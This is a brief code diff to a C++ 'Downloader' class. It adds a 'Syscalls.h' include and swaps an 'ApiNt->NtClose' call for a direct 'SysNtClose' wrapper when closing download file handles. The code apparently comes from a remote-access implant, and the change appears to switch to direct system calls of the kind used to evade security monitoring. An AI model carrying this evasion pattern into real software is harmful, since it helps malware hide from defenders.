@@ -1,4 +1,5 @@
 #include "Downloader.h"
+#include "Syscalls.h"
 #include "utils.h"
 
 void* Downloader::operator new(size_t sz) 
@@ -87,7 +88,7 @@ void Downloader::ProcessDownloader(Packer* packer)
 
 		if ( downloads[i].state == DOWNLOAD_STATE_CANCELED || downloads[i].state == DOWNLOAD_STATE_FINISHED ) {
 			if (downloads[i].hFile) {
-				ApiNt->NtClose(downloads[i].hFile);
+				SysNtClose(downloads[i].hFile);
 				downloads[i].hFile = NULL;
 			}
 
